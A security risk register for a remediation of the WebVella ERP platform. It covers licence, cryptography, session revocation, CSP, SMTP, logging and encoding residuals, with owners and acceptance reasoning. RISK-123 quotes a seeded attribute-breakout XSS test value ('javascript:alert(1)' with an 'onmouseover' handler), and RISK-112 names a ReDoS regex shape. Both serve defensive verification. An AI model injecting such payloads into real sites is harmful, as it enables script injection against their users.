# Risk Register

Accepted risks, open decisions and residual exposure arising from the security remediation.
Findings are described in the [security audit report](security-audit-report.md); the changes made
are recorded in the [remediation log](remediation-log.md).

Each entry states what the risk is, who owns the decision, and — where the risk is accepted — the
reasoning that justifies acceptance.

## Canonical risk index

This table is the register at a glance and is **authoritative for what each identifier means**. Where
an identifier carries more than one detailed entry below, those entries are complementary analyses of
the same risk written from different angles; the subject and status in this table govern.

| Ref | Subject | Status | Owner |
| --- | --- | --- | --- |
| `RISK-001` | `AutoMapper`: every version that patches `GHSA-rvv3-g6hj-g44x` is licensed under the Reciprocal Public License 1.5, which conflicts with the product's declared Apache-2.0 and its publication to nuget.org. The advisory is **closed** by pinning `[15.1.3]` with no suppression anywhere; the **licence question is not decided and cannot be decided here.** An earlier revision recorded it as decided by Engineering — `CR2-F-04` rejected that as absorbing an owner decision. `dotnet pack` now **fails** (`ERPLIC001`) until the owner records an answer, so the unratified claim cannot reach nuget.org while `build`, `publish` and `run` stay unaffected. | **Open — pending owner ratification, mechanically blocked from shipping meanwhile** | Repository owner / legal |
| `RISK-002` | Uncontrolled recursion in `AutoMapper` remains a weakness class that outlives any single version change; it is reachable only through a self-referential mapping the project's own developers would have to author. | Accepted | Platform team |
| `RISK-003` | Credential hashing uses PBKDF2-HMAC-SHA256 at 600,000 iterations rather than bcrypt, scrypt or Argon2, deviating from the literal wording of the mandated cryptographic standard while satisfying its intent and adding no dependency. | Accepted | Platform team |
| `RISK-004` | `CA5351` (broken cryptographic algorithm) is reported on the retained legacy MD5 verification path, which must stay until every stored credential has been upgraded on login. **Cited from `WebVella.Erp/Utilities/CryptoUtility.cs`.** | Accepted | Platform team |
| `RISK-005` | ~~The Content-Security-Policy report endpoint bounds *logging* rather than *acceptance*.~~ **Retired.** The report-collection endpoint was removed outright, so the CWE-779 log-flooding vector it introduced no longer exists. There is no anonymous report sink and no `report-uri` directive. | **Retired — no longer applicable** | Platform team |
| `RISK-006` | Deterministic initialisation vector in the symmetric encryption helpers (finding `M-08`). Latent — no active caller — and changing it would make already-encrypted data undecryptable. **Cited from `WebVella.Erp/Utilities/CryptoUtility.cs`.** | Accepted | Platform team |
| `RISK-007` | **Closed.** Sign-out revokes the session server-side for **both** credential forms. Every cookie ticket and every bearer token now carries the same per-sign-in `erp_session_id`; sign-out records it, the cookie ticket-validation hook and both bearer validators consult it, and the refresh endpoint refuses to mint a successor for a revoked identifier. The asymmetry this entry used to record — cookie revocable, bearer not — no longer exists. The in-process scope of the store remains as `RISK-036`. | Closed — store-scope residual tracked as RISK-036 | Platform team |
| `RISK-008` | Login throttling is per-process, so its state neither spans instances nor survives a restart. | Accepted | Platform team |
| `RISK-009` | A throttle refusal and a credential rejection differ in response length, which is a weak oracle for whether an account is currently locked out. | Accepted | Platform team |
| `RISK-010` | **Restated at the code-review checkpoint.** The identifier bound is **67 bytes**, not 63: every caller passes an already-prefixed name (`rec_`/`rel_`, 4 bytes) and the platform caps the unprefixed name at 63 characters, so 67 is the longest *legitimate* physical name. Names beyond it fail hard. The residual is a **creation-time uniqueness** question the quoting helper cannot see — it inspects one name at a time — and index names bypass the helper entirely at up to 133 bytes. | Accepted | Platform team |
| `RISK-011` | A derived page model that re-declares `ReturnUrl` would bypass the sanitising setter on the base model. Guarded by convention and by comment, not by the compiler. | Accepted | Platform team |
| `RISK-012` | The generic record-update path can overwrite a password hash with a blank value; the user-facing save path is verified not to. | Named, not fixed | Platform team |
| `RISK-013` | Two hosts served a permissive `Access-Control-Allow-Origin: *`. **Resolved — both hosts now carry an explicit origin allow-list, verified on the wire.** The close was two-stage, which is recorded rather than smoothed over: `WebVella.Erp.Site` was corrected in the original remediation, and `WebVella.Erp.Site.Project` only in follow-up work, after review found the second host still permissive while the finding was already reported as fixed. No live `AllowAnyOrigin()` call remains anywhere in the repository. Retained as an identifier because earlier revisions of this register and the audit report cite it as an open risk. | Resolved | — |
| `RISK-014` | Two bearer-token error paths return stack traces **unconditionally**, so setting `Production` does not suppress them (finding `H-13`). | Named, not fixed | Platform team |
| `RISK-015` | `/ckeditor/ImageFinder` returns HTTP 500; proven pre-existing by counterfactual. | Named, not fixed | Platform team |
| `RISK-016` | Three navigation anchors carry `href="javascript: void(0)"` — Bootstrap dropdown placeholders, **not** injection sinks. | Named, not a defect | Platform team |
| `RISK-017` | One host's `Startup.cs` lacks the UTF-8 byte-order mark the repository's own `.editorconfig` mandates. | Named, not fixed | Platform team |
| `RISK-018` – `RISK-020` | Further pre-existing issues named but deliberately not fixed; see the table under *risks arising from the integrated controls*. | Named, not fixed | Platform team |
| `RISK-021` | The shipped `Config.json` files contained a live connection string, encryption key, token signing key, storage connection string and mail password, with `DevelopmentMode: true`. **All eight files are now scrubbed**, `web.config` sets `Production`, and the seeded administrator credential is no longer a literal. | **Closed** for the tracked configuration files; see `RISK-026` for the residual | Platform team |
| `RISK-026` | The demo credential in the Blazor WebAssembly **client** page `Client/Pages/Index.razor.cs` is **removed**; what stays is that every secret ever published in this repository's **history** remains public. | **Reduced** — the client-side literal is closed; the history residual is accepted, with a CI detective control | Platform team |
| `RISK-027` | The generated initial administrator password has **no change-required-on-first-login marker**, because adding one requires a schema change the constraints forbid. | Accepted | Platform team |
| `RISK-028` | When the only configured package source is a **local folder mirror**, the dependency restore emits no `NU19xx` diagnostic at all, so promoting the audit codes to errors cannot close that fail-open path. It is closed instead by the workflow's advisory negative control. | Accepted — mitigated by a second, independent mechanism | Platform team |
| `RISK-029` | A `.csproj` that **assigns** rather than appends to `WarningsAsErrors` would silently discard the whole dependency gate for that project. No project does so today; the structural fix (a `Directory.Build.targets` re-appending the codes after every project body) is outside the authorised file set. | Named, not fixed — documented control only | Platform team |
| `RISK-030` | A solution-level command reaches **17 of 19** projects; the two WebAssembly projects are covered by dedicated restore, build and advisory steps instead, so coverage is complete at 19 of 19 by two routes rather than one. A workflow step asserts every tracked `.csproj` is in exactly one of the two sets. Enrolling them in `WebVella.ERP3.sln` was tried and **reverted twice** — the frozen plan authorises only the path-casing repair in that file (`CR2-F-06`). | Accepted — disclosed in CI and in the guides. Was briefly recorded as closed by enrollment. | Platform team |
| `RISK-031` | Running an **unpublished** build directory under a non-Development environment leaves every `/_content/**` static asset unmapped, returning `405 Allow: DELETE` and an unstyled site. The obvious workaround — setting `ASPNETCORE_ENVIRONMENT=Development` — would undo the `H-12` and `H-15` remediations. Pre-existing; the host builder is outside the authorised file set. | Named, not fixed — documented control only | Platform team |
| `RISK-022` | **Narrowed.** Content-Security-Policy still ships in report-only mode *by default*, because enforcing it as written would break working screens. What is no longer true is that enforcement was unreachable: it is now selected by the configuration key `SecurityHeaders:ContentSecurityPolicyReportOnly` (environment form `SecurityHeaders__ContentSecurityPolicyReportOnly`), whose polarity is inverted — setting it to `false` is what *enforces* the policy — so the remaining risk is a rollout decision rather than a missing capability. The policy **value** itself is not configurable and must not become so: `SecurityHeadersOptions.ContentSecurityPolicy` is a `public const` holding the mandated string byte-for-byte, and only the delivery mode is bindable. | Accepted | Platform team |
| `RISK-023` | **Narrowed.** Four by-design raw-output channels are deliberately not encoded, because encoding them would disable the features they implement. What is no longer true is that they sit among a wider set of unencoded stored channels: every stored sink whose markup the platform itself composes is now encoded at its builder, so these four are the **only** raw channels remaining and their compensating control is now defence in depth behind an actual fix. Counting raw *calls* rather than raw *channels* gives a larger number and does not contradict this: the remaining calls render markup the server composes from an enum or an identifier - the list `action` cells, and the data-source `icon` cell, whose value is `PageUtils.GetDataSourceIconBadge(DataSourceType.DATABASE\|CODE)` - so no stored text reaches them, and the navigation and menu calls render a value already encoded at composition in `BaseErpPageModel`. | Accepted | Platform team |
| `RISK-024` | The static-analysis backlog is reported as warnings rather than enforced as errors, because promoting roughly 3,000 pre-existing diagnostics would force the mass refactor the constraints forbid. | Accepted | Platform team |
| `RISK-025` | Residual observations around the `H-10` deserialisation binder: the binder is measurably **inert at an `ExpandoObject` target**, the serialisation counterparts are deliberately unconstrained, the `JobResultWrapper` fallback branch is effectively unreachable for well-formed payloads, and — added while closing review finding `F18` — the tightened allow-list imposes a **forward-compatibility constraint on any future first-party type persisted in a polymorphic payload**. **Cited from `WebVella.Erp/Api/Models/AutoMapper/Profiles/JobProfile.cs`.** | Accepted / named, not fixed | Platform team |
| `RISK-032` | The `smtp_service` credential is **not encrypted at rest**. The finding's other five sub-requirements are implemented; this one is declined with a four-part rationale, and the closing control for the stated exploit is the authorisation narrowing rather than encryption. | Named, not fixed — reasoned decline | Repository owner |
| `RISK-033` | The SMTP certificate-validation opt-out is honoured **only in Development posture**; outside it the setting is refused and the refusal is reported once per process. The residual is the Development posture itself, which still accepts any certificate by design. | Accepted | Platform team |
| `RISK-034` | The `smtp_service` permission migration revokes **only** the Regular and Guest grants rather than replacing the permission lists, so a delegation an operator created on a custom role survives the migration. Reviewing those delegations is an operator action the migration cannot take for them. | Accepted — deliberate scope choice | Repository owner |
| `RISK-035` | Four residual observations recorded while closing the SMTP credential work: the `email` entity's Regular-role grants, inert sitemap node access lists in the mail plugin, the row-driven shape of the EQL entity read-permission check, and the pre-existing `catch (ValidationException ex) { … throw ex; }` idiom in `ProcessPatches()`. | Named, not fixed | Platform team |
| `RISK-036` | The session-revocation store is **in-process**: it neither survives a restart nor spans instances, so behind a load balancer each instance enforces only its own view of who has signed out. Separately, authentication tickets minted **before** this control shipped carry no session claim and are therefore accepted rather than rejected — a deliberate transitional choice that avoids signing every user out on deployment. | Accepted | Platform team |
| `RISK-037` | Sitemap node URLs are HTML-encoded but their **scheme is not validated**, so an administrator who can author a sitemap node can still store a `javascript:` URL that runs when the link is activated. HTML encoding closes the markup-breakout half of the weakness and does not close the scheme half. Declined here because scheme filtering would break legitimate `mailto:` and `tel:` navigation entries. | Named, not fixed — reasoned decline | Repository owner |
| `RISK-038` | The encoder rewrites four legitimate value shapes — `&`, `'`, `+` and every non-ASCII character — so encoded output is **render-equivalent but not byte-identical** for those shapes. A downstream consumer that reads the composed markup as a string rather than parsing it as HTML would see the difference. | Accepted | Platform team |
| `RISK-039` | Stored output encoding lives in the **markup builders**, not in the views, because the views cannot encode without breaking the navigation. Nothing in the compiler prevents a future builder from interpolating an unencoded value. Guarded by comment, by a source-invariant check in the verification harness, and by this entry — not by the type system. | Accepted | Platform team |
| `RISK-040` | Ten information-disclosure sites in the two plugin controllers — seven in `WebVella.Erp.Plugins.SDK/Controllers/AdminController.cs` and three in `WebVella.Erp.Plugins.Project/Controllers/ProjectController.cs` — now return the generic message outside Development but write **no** server-side log record, so the underlying fault detail is unavailable anywhere in Production. The guard closes the disclosure; it does not preserve the diagnostic. | Named, not fixed — recommended | Platform team |
| `RISK-041` | Repeated unhandled faults from the same source collapse to one persisted record per minute per source. The suppressed **count** is reported in a separate accounting record, but per-occurrence detail for the suppressed repeats is not retained, and the bounding state is in-process rather than shared across instances. | Accepted | Platform team |
| `RISK-042` | Thirteen SDK developer-tool **Razor Page** models still surface `ex.Message` through the platform's `ValidationError` mechanism rather than through an HTTP JSON response. They are a different mechanism with a different consumer, they are outside this change's file scope, and the SDK entity and user editors depend on seeing the system message to be usable at all. Documented with a recommended fix rather than changed. | Named, not fixed — out of scope | Platform team |
| `RISK-043` | In Production an administrator using the SDK data-source test tool now sees the fixed generic message for an *unexpected* fault instead of the exception text. Genuine EQL syntax and schema feedback is unaffected because it travels a different clause. The detail is retrievable from `system_log` through the platform's own log viewer. | Accepted | Platform team |
| `RISK-044` | The schedule manager still writes **notification-eligible** error records through `LogService`, so a repeatedly failing schedule plan can generate repeated outbound e-mail. It is a background timer rather than a request-reachable path, so no caller can drive its rate and it is not the amplification vector the remediated finding describes. Observed live: eight notifying records for one failing mail-queue plan. | Named, not fixed — out of scope | Platform team |
| `RISK-045` | The per-field value collector in `WebVella.Erp/Api/RecordManager.cs` re-wraps any field-conversion failure as `Invalid value: '<value>'`, interpolating the submitted value. On a password field that value is a plaintext credential. The password-policy pre-pass added for review finding `F25` was deliberately built to **report** rather than **throw** so that it does not arm this path, and that was verified live — but the hazard remains reachable through any *other* conversion failure on a password field. | Named, not fixed — pre-existing | Platform team |
| `RISK-046` | The 12-character minimum and the complexity rules are deliberately **absent** from `PasswordUtil.HashPassword` and from `SecurityManager.UpgradeStoredPasswordHash`. Pushing the floor down into the primitive would abort the legacy rehash-on-next-authentication migration for exactly the accounts it exists to rescue, and would abort it silently. The maximum length, which is a resource bound rather than a policy floor, *is* enforced there. | Accepted — structural invariant | Platform team |
| `RISK-047` | Two exemptions in the record-write password pre-pass are load-bearing and are therefore not “tightened”: a **blank** value, which both collectors already read as *leave the stored value alone*, and the **redaction marker** `__WV_REDACTED_a7f3c1e9__`, which is a read artefact a client round-trips having never seen the real hash. Refusing either would break ordinary record updates. Neither can become a stored credential, because both collectors drop them before hashing. | Accepted | Platform team |
| `RISK-048` | The project plugin's script endpoint stays `[AllowAnonymous]`. Review finding `F27` closed everything the exemption could be used to reach — the caller's string no longer selects a resource, reaches a log or reaches an exception path — but two static scripts are still served without credentials, which is finding `M-10` and remains a documented decline. | Accepted — M-10 decline preserved | Platform team |
| `RISK-049` | The configuration probe added for review finding `F30` **prefers** `Config.json` and falls back to `config.json`. A deployment directory that carries a stale lower-case duplicate and has lost the correctly cased file will start from the stale copy silently. The fallback exists because deployments produced by the earlier lower-case code path carry only that name, so removing it would trade one startup failure for another. | Accepted — compatibility residual | Deployment owner |
| `RISK-050` | **Narrowed.** The migration ladder head is **4**, not 5: the version-5 block, its `MigrateSecurityDefaults5` method and the always-on `ReconcileGuestRecordPermissions` reconciliation were withdrawn as remediation beyond the frozen AAP scope, so nothing re-asserts a revocation on every start. What remains is the version-4 revocation itself, which removes the Guest role unconditionally when a pre-4 installation crosses the ladder **once**: an operator who deliberately re-granted Guest create or read on the `user` or `role` entity *before* that upgrade will lose it. After the ladder head is reached the revocation never runs again, so a re-grant made later is preserved. Same shape as `RISK-034` for the SMTP permission migration, but bounded to a single crossing. | Accepted — deny-by-default takes precedence at the one crossing | Platform team |
| `RISK-051` | **Restated, and the residual is now larger.** The twelve taint-analysis rules `CA3001`-`CA3012` do **not** run. Reaching them needed `AnalysisLevelSecurity=latest-all` plus a repository-root `.globalconfig` carrying `interprocedural_analysis_kind = None`, and both were withdrawn: AAP 0.6.1 Class 2 freezes the analyzer gate at `EnableNETAnalyzers` + `AnalysisLevel=latest-recommended`, and the cost is not survivable without the per-rule options a `.globalconfig` would supply — with the file removed but the level left at `latest-all`, a single-project build that had taken 109 s did not finish inside **600 s**. Their silence is therefore not evidence of absence for any injection weakness they would detect, single-method or interprocedural. | Accepted — the family is out of the gate entirely; compensated by four independent controls, named in the detailed entry | Platform team |
| `RISK-052` | **Restated, and split in two.** Of the five rules previously described as enabled-but-held-at-`Warning`, only **`CA5351` (5 sites)** still executes; it stays a warning because promoting it would demand exactly the mass refactor the governing change constraint forbids. The other four — `CA2100`, `CA2326`, `CA2328`, `CA5362` — do **not** execute at all under the frozen `AnalysisLevel=latest-recommended` with no global analyzer config, so their 19 previously-reviewed sites are no longer covered by **any** automated gate and are carried as a documented, human-reviewed inventory in the detailed entry instead. | Accepted — `CA5351` visible and counted; the other four have no automated coverage and are inventoried by hand | Platform team |
| `RISK-053` | The three GitHub Actions the security workflow consumes are pinned to 40-character commit SHAs, which is what closes the mutable-tag supply-chain exposure — and which also means they no longer receive upstream security fixes automatically. A pinned action is frozen until a human moves it. | Accepted — deliberate trade, requires a periodic review task | Platform team |
| `RISK-055` | ~~The anonymous `/csp-violation-report` collector is bounded by method, transport, body size, per-source acceptance ceiling and log volume, but **not** by request content type — a control considered and declined rather than overlooked.~~ **Retired.** The collector was removed outright, so there is no endpoint to bound and no declined control to carry: `MaxViolationReportBytes`, `ShouldAcceptReportFromSource`, `ShouldLogReport` and `IsRequestEffectivelyHttps` are all absent from the tree. The reasoning is retained in the detailed entry as a record of the decision. | **Retired — no longer applicable** | Platform team |
| `RISK-054` | `CA5359` is one of the four Security-category rules the frozen gate enables, at **warning** severity and a measured count of zero, and it detects the accept-all certificate shapes this codebase actually used — a `RemoteCertificateValidationCallback` or a MailKit client's `ServerCertificateValidationCallback` assigned a lambda that always returns `true`. It does **not** detect the same defect expressed as `HttpClientHandler.ServerCertificateCustomValidationCallback`, which was measured rather than assumed. A developer could reintroduce accept-all through that one shape and keep the build green. | Accepted — narrow detector gap, measured and named | Platform team |
| `RISK-056` | ~~The `/csp-violation-report` per-source acceptance ceiling is 60 accepted reports per source per minute, while browser instrumentation measured 13 to 146 beacons for a single page load, so a shared source address is largely refused.~~ **Retired.** The ceiling and the collector it bounded were both removed; `MaxAcceptedReportsPerSourcePerMinute` no longer exists. The beacon measurements are retained in the detailed entry because they remain the evidence for how much inline style and script the report-only policy still reports. | **Retired — no longer applicable** | Platform team |
| `RISK-057` | `ScheduleManager.ProcessSchedulesAsync` writes its own failure through `Log.Create` inside a `catch` with no inner guard, so a transient PostgreSQL timeout on that diagnostic write escapes to the thread pool and terminates the entire web host. Observed once under extreme machine load. Pre-existing platform code, byte-identical to `HEAD`, and a reliability rather than a security defect. | Documented — out of scope under AAP 0.3.2 (no refactoring beyond security) | Platform team |
| `RISK-058` | Two third-party assets shipped by the `WebVella.TagHelpers` package reference source maps (`bootstrap.css.map`, `decimal.min.js.map`) that the package does not include. Requests for them return the application's uniform catch-all 405. Only a browser with DevTools attached ever issues them. Vendor content, which AAP 0.3.2 excludes from modification. | Documented — out of scope (third-party content, version updates only) | Platform team |
| `RISK-059` | ~~`global.json` pins the SDK as `10.0.302` but with `rollForward: latestPatch`, so a later patch on the 10.0.3xx band is accepted.~~ **CLOSED by review finding `CR2-F-13`.** The residual this entry accepted no longer exists: `rollForward` is now `disable`, so the toolchain is exact and the gate's recorded results are reproducible by construction. The outage argument that justified accepting the drift was re-weighed and rejected; adopting a newer SDK is now a deliberate, documented re-baseline instead. | Closed | Platform team |
| `RISK-060` | An installation may set `Settings:EmailSMTPCheckCertificateRevocation` to `false` to reach an SMTP relay whose certificate chain publishes no fetchable CRL or OCSP endpoint. That relaxation is honoured **in every posture, including Production, deliberately** — and while it leaves the trust chain, validity dates, key usage and host name enforced, it does mean a relay certificate whose key has leaked and whose issuer has since revoked it will no longer be refused. The alternative was worse in both directions: leaving revocation unconditional denies service to valid relays with no supported remedy, and the only pre-existing escape hatch accepts *any* certificate and is refused in production. | Accepted — conditional on the operator recording it; the preferred fix is to publish the revocation source | Deployment owner |
| `RISK-061` | `SmtpInternalService.ProcessSmtpQueue` serialises itself with a `static object` lock and a `static bool` in-progress flag, which are per-process. Two hosts, or a host plus the console application, each run a full pass over the same `Pending` rows and each delivers them: three queued messages driven by two concurrent processes produced six deliveries against three database rows, all left at `Sent`. There is no row-level claim (no `SELECT … FOR UPDATE SKIP LOCKED`, no owner column, no lease) so the duplication is structural, not a race window. Pre-existing platform code, byte-identical to `HEAD`, and a delivery-semantics rather than a security defect. | Documented — out of scope under AAP 0.1.3 guideline 8 (document, do not fix unless Critical) | Platform team |
| `RISK-062` | Neither `SmtpService` nor `SmtpInternalService` ever assigns `client.Timeout`, so MailKit's constructor default of 120,000 ms stands at all five connect sites. A connection-security value that disagrees with the port — implicit TLS configured against a STARTTLS port, or the reverse — therefore blocks the calling request or the queue pass for two minutes before it reports anything. Identical before and after the H-11 change; the certificate work neither introduced nor widened it. | Documented — out of scope under AAP 0.1.3 guideline 8; the operator-facing symptom is recorded in the secure-configuration guide | Platform team |
| `RISK-063` | An SMTP service row whose `connection_security` is `0` (`SecureSocketOptions.None`) delivers over an unencrypted channel, and if the row also carries a username the relay credential is transmitted in the clear. Observed on the wire: no `STARTTLS` issued, no TLS established, the `AUTH` command sent on the cleartext socket, and the message accepted — all while certificate revocation checking was at its secure default, because no certificate is involved on that path at all. This is a transport-configuration property (CWE-319), not a gap in certificate validation, and the platform applies no minimum-security floor to the value. | Documented — out of scope under AAP 0.1.3 guideline 8 and 0.3.2 (no feature additions); a deployment-configuration responsibility | Deployment owner |
| `RISK-064` | The four direct `SmtpService.SendEmail` overloads construct and persist their `Email` record only after `client.Send` returns, so a send that throws leaves no `rec_email` row at all: a failed direct send produced zero rows where the same send after remediation produced one at `Sent`. The queued path is asymmetric — it persists the row first and records the failure text in `server_error` — so a transport failure is auditable when queued and invisible when sent directly. An observability gap rather than a security defect; the exception still propagates to the caller and the platform's own log path is unaffected. | Documented — out of scope under AAP 0.1.3 guideline 8 | Platform team |
| `RISK-065` | `SmtpInternalService.ValidatePreUpdateRecord` reads the incoming `port` with `rec["port"] as string` and then builds its error model with the hard cast `(string)rec["port"]`, while the create-side hook uses `rec["port"]?.ToString()` for both. An update whose `port` arrives as a JSON number is therefore rejected — `InvalidCastException: Unable to cast object of type 'System.Int32' to type 'System.String'` thrown inside the validation hook — and `RecordManager` converts it to the generic `The entity record was not update. An internal error occurred!` with no field-level detail. The identical value sent as a string succeeds. Pre-existing: the checkpoint diff for this file is exactly the two certificate hunks. | Documented — out of scope under AAP 0.1.3 guideline 8 (a correctness defect with no security consequence) | Platform team |
| `RISK-066` | The SMTP-service test page path raises `ValidationException` through its parameterless constructor and attaches every detail to `.Errors`, so the exception's own `Message` carries no text. Any consumer that logs or displays `ex.Message` alone — including the generic internal-error surface that `RecordManager` produces — reports a failure with no indication of which field was rejected or why. Observed together with `RISK-065`: the caller received only the generic internal-error string and an empty error collection. | Documented — out of scope under AAP 0.1.3 guideline 8 | Platform team |
| `RISK-067` | `ErpSettings.Initialize` parses seven boolean settings with the idiom `string.IsNullOrWhiteSpace(...) ? default : bool.Parse(...)`, so a malformed value fails the host closed with `FormatException: String 'notabool' was not recognized as a valid Boolean.` The message names the offending **value** but never the offending **key**, unlike the encryption-key validation in the same file which names its setting explicitly. Failing closed is the correct posture and is deliberately preserved; only the diagnosability is poor, and it applies to `Settings:DevelopmentMode` — the discriminator for the certificate opt-out posture — among six others. | Documented — out of scope under AAP 0.1.3 guideline 8 and 0.3.2 (no refactoring beyond security) | Platform team |
| `RISK-068` | `SmtpService.Username` carries `[JsonProperty("username")]` and is therefore present in any serialisation of a cached SMTP service, while `Password` carries `[JsonIgnore]` and is correctly withheld. The `smtp_service` entity is administrator-only and the username alone is not a credential, so the residual is the disclosure of one half of a relay credential pair to a principal who can already read the row. Recorded so the asymmetry is a deliberate, reviewed position rather than an oversight. | Documented — out of scope under AAP 0.1.3 guideline 8 | Platform team |
| `RISK-069` | The MVC `CookieTempDataProvider` cookie is left at framework defaults, so it is emitted without `Secure` while the authentication cookie is pinned to `SecurePolicy.Always` in every environment and the antiforgery cookie is pinned to `Always` outside Development. | Documented — out of scope under AAP 0.1.3 guideline 8. | Platform team |
| `RISK-070` | The default CORS policy is applied globally by a bare `app.UseCors()`, so it evaluates Razor Page form POSTs as well as API calls and logs `CORS policy execution failed` for same-origin submissions that then succeed. | Documented — out of scope under AAP 0.1.3 guideline 8. | Platform team |
| `RISK-071` | 74 unresolved relative links across 64 pre-existing files under `docs/developer/**`: 29 root-absolute `/doc-images/...` image links with no `docs/doc-images` directory, and 45 extension-less cross-references written relative to the repository root rather than to the containing page. | Documented — pre-existing, out of scope under AAP 0.1.3 guideline 8. | Platform team |
| `RISK-112` | Bounding regular-expression cost narrows what a record filter accepts: the product of explicit repetition bounds is capped at 256, back-references and stacked quantifiers are refused, and a regex query executes under 60 seconds rather than 600. The textbook `(a+)+` shape is deliberately **admitted**, measured harmless on PostgreSQL's hybrid DFA/NFA — an admission contingent on that engine, so `DbRegexPattern` must be revisited if the regex implementation ever changes. | Accepted | Platform team |
| `RISK-113` | The SDK host's `/dev` page remains **anonymous in the Development environment**, and the Blazor circuit endpoint remains anonymous there with it. Closing `M-09`'s Production half by gating rather than deleting the exemption is what preserved the SDK development workflow the Agent Action Plan section 0.3.2 explicitly refused to break, so the Development half is retained deliberately. | Accepted | Platform team |
| `RISK-114` | A deployment that supplied a **non-ASCII** `Settings:EncryptionKey` and encrypted data under it is now refused at start-up, because acceptance measured characters while derivation consumed ASCII bytes and silently substituted `?` for each character above U+007F. Recovery is deterministic — replace each non-ASCII code unit with `?` — and is documented with the one measured case where the substituted key cannot be re-supplied because it no longer clears the character-variety floor. Rotation afterwards is mandatory, not advisable. | Accepted | Platform team |
| `RISK-115` | With `Settings:DataProtectionKeyDirectory` configured, the Data Protection key ring is written to disk **unencrypted**, because every supported at-rest encryptor needs deployment-provided certificate material, a Windows-only facility, or a new package dependency the plan forbids. The setting is opt-in, per-application isolation does not depend on this entry, and the two ways to close it — a certificate, or an encrypted volume — are recorded with the file-system controls that bound it meanwhile. | Accepted | Platform team |
| `RISK-116` | ~~Gate 3 accepts exactly **one** credential-shaped location: a commented-out connection-string template in `WebVella.Erp.Site/Config.json` whose every value is angle-bracketed.~~ **CLOSED - the residual no longer exists.** The commented-out template was removed from `WebVella.Erp.Site/Config.json`, so the reviewed allowance now has nothing to allow: Gate 3 reports **0 credential-shaped locations and 0 tolerated** across 1,518 tracked text files. The reasoning is retained below because the *decision* it records still governs - narrowing the pattern to ignore an angle-bracketed value was rejected as a fail-open for any real password containing `<`, and that pattern is unchanged. | Closed | Platform team |
| `RISK-117` | The licence-governance gate that keeps `RISK-001` unshippable refuses to **build** a package, not to **publish** one: a `.nupkg` produced before the gate existed remains pushable, and the gate can confirm that an answer was recorded but not that the person recording it was entitled to. What it buys is deliberateness — the answer must be typed and appears in the log or the diff — on the one step that cannot be undone. | Accepted — bounded residual of the control | Whoever performs a release |
| `RISK-118` | Authenticated page renderings stay recoverable from the **browser's** back/forward cache after logout, because authenticated content responses carry no `Cache-Control` while `/login` and `/logout` do. Measured during runtime verification: two presses of Back after logout restored the authenticated shell with **no document request issued**. The restored view is inert — the same ticket replayed against four protected routes is refused server-side — so what survives is one already-delivered rendering on a device an attacker must already hold. Recorded with a minimal fix rather than remediated: `Cache-Control` is not in the mandated seven-header set, and the ticket-acceptance weakness behind `CR2-F-01` / `CR2-F-02` is separately proven closed. | Accepted — documented with fix guidance | Platform team |
| `RISK-119` | Two **pre-existing** defects in the shipped Blazor WebAssembly client's HTTP layer, found while remediating `B3-SEAM-01` and outside its scope. `Client/Services/TokenManagerService.cs` builds its refresh URL as `api/v3/en_US/auth/jwt/token/refresh` on an `HttpClient` whose `BaseAddress` already ends in `/api/`, so the client's automatic token refresh addresses a doubled segment that no route serves. `Client/ApiService/ApiService.System.cs` sets a **lower-case** `bearer` scheme on `DefaultRequestHeaders`, and both token-issuing hosts select the authentication handler by a case-**sensitive** `Authorization` prefix match, so those calls are not authenticated as bearer at all — and the credential is left attached to a shared client rather than scoped to one request. Neither is a new exposure and neither weakens the `B3-SEAM-01` fix, which builds its own URL and sets its own correctly-cased request-scoped header. | Accepted — documented with fix guidance | Platform team |
| `RISK-120` | The page header's `description` attribute is the **one** value on `WvPageHeader` that is deliberately rendered raw, and it must stay that way. Its only non-literal supplier, `PageUtils.GenerateListPageDescription`, composes an inline `ul`/`li` list wrapping a bold `sorted by` and `filtered by`, so encoding at the sink would show those tags to the user as literal text on every list screen in the product. The two attacker-influenceable values that builder interpolates are encoded **at the builder** instead, which closes `P-22`; what remains is the structural fact that the channel is raw, and therefore that any future caller passing untrusted text into `description` reintroduces the sink. Guarded by an in-code comment at the sink that forbids conversion, and by the encoding being applied where the value and the markup are still distinguishable. | Accepted — by design, with the exploitable half fixed | Platform team |
| `RISK-121` | QA finding `F-AA` path 4: the Track Time grid's **title** cell is sanitised by a tag allow-list that produces real `<b>` elements rather than encoding them. No grid-rendering source exists in this repository — `wv-grid` ships inside the third-party `WebVella.TagHelpers` 1.8.0 package, which the plan restricts to version updates — and a sanitiser that emits `<b>` while stripping `<script>` is behaving as designed. QA measured nothing exploitable: no dialog, no live handler, hostile rectangles 0 × 0. | Named, not fixed — third-party, non-exploitable as measured | Platform team |
| `RISK-122` | The **33** remaining findings from the frontend QA pass — 21 Minor and 12 Info — are pre-existing quality, accessibility, responsive-layout and environment observations in code this remediation never touched, each carrying a git-level counterfactual proving pre-existence. They are enumerated with recommended fixes in the detailed entry below, grouped by theme. The plan declines them: minimal code changes only, no feature additions, no refactoring beyond security requirements, third-party libraries restricted to version updates, and fix only what is confirmed. | Documented for a future sprint | Platform team |
| `RISK-123` | Administrator-authored entity and application metadata — the stored `color` and `icon_name` keys, reaching the `color`, `icon-color` and `icon-class` attributes — flows from the database into the page header's `style` and `class` **attributes**, where a privileged author can inject additional **CSS declarations**. Found while auditing the remaining `AppendHtml` arguments during final validation, not reported by QA. Measured rather than assumed: the framework's `TagBuilder` encodes attribute values, so a seeded `#f44336;background:url(javascript:alert(1))" onmouseover="alert(9)` rendered as `style="background-color:#f44336;background:url(javascript:alert(1))&quot; onmouseover=&quot;alert(9);"` — the quote is `&quot;`, the `onmouseover=` is inert text **inside** the style value, and no attribute or handler is created. What survives is the CSS declaration itself, which needs no HTML-special character. Not remediated: it is not a script-execution sink, it requires the same SDK/administrator rights as the raw channels `RISK-023` already accepts, and sanitising it would constrain the **34** legitimate colour and icon bindings verified rendering correctly across every screen. | Accepted — privilege-gated CSS channel, proven not a handler sink | Platform team |
| `RISK-124` | Every required-configuration abort surfaces as an **unhandled exception**: the host prints the actionable message, then a stack trace, and exits **134** rather than exiting non-zero with a single line. This is framework-default behaviour for a `Startup.Configure` throw and it is fail-closed - the process never serves a request and no value is echoed - but a container orchestrator reports a crash where the cause is a configuration fault, which can lengthen operator triage. Applies to the secret validation in `WebVella.Erp/ErpSettings.cs`, the encryption-key accessor in `WebVella.Erp/Utilities/CryptoUtility.cs`, the Content-Security-Policy option binding and the transport-security check in `WebVella.Erp.Web/ErpMvcExtensions.cs`. | Accepted - documented with fix guidance | Platform team |
